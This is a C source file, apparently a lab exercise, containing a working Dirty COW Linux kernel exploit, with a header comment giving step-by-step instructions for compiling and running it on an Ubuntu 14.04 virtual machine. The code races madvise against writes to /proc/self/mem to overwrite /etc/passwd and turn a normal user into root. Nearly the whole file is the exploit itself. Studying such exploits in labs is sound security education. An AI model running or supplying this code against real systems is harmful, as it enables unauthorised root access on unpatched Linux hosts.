/**
 * To try this script out -----
 *
 *     0. Download ubuntu-14.04.3-desktop-i386.iso from
 *     http://old-releases.ubuntu.com/releases/14.04.0/
 *     and run it as a Virtual Machine. Download this file.
 *
 *  	1. Compile the Dirty COW exploit script:
 * 			gcc -pthread -o dirty_cow_exploit dirty_cow_exploit.c
 *
 * 		2. Run the compiled exploit script as a normal user:
 * 			./dirty_cow_exploit
 *
 * 		3. Verify results:
 * 			cat /etc/passwd | grep malicious_user
 *
 * 		4. Verify privileges:
 * 			su malicious_user
 * 			id
 */

#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>

void *map;

void *writeThread(void *arg)
{
	char *content = "0000";
	off_t offset = (off_t)arg;
	int f = open("/proc/self/mem", O_RDWR);
	while (1)
	{
		// Move the file pointer to the corresponding position.
		lseek(f, offset, SEEK_SET);

		// Write to the memory.
		write(f, content, strlen(content));
	}
}

void *madviseThread(void *arg)
{
	int file_size = (int)arg;
	while (1)
	{
		madvise(map, file_size, MADV_DONTNEED);
	}
}

int main(int argc, char *argv[])
{
	pthread_t pth1, pth2;
	struct stat st;
	int file_size;

	// Create user with ID 1001 if it does not exist already
	int status = system("id -u 1001 > /dev/null 2>&1 || sudo useradd -u 1001 -m malicious_user");

	// Open the target file in the read-only mode.
	int f = open("/etc/passwd", O_RDONLY);

	// Map the file to COW memory using MAP_PRIVATE.
	fstat(f, &st);
	file_size = st.st_size;
	map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

	// Find the position of the target area
	char *position = strstr(map, "1001");

	// We have to do the attack using two threads.
	pthread_create(&pth1, NULL, madviseThread, (void *)file_size);
	pthread_create(&pth2, NULL, writeThread, position);

	// Wait for the threads to finish.
	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);
	return 0;
}

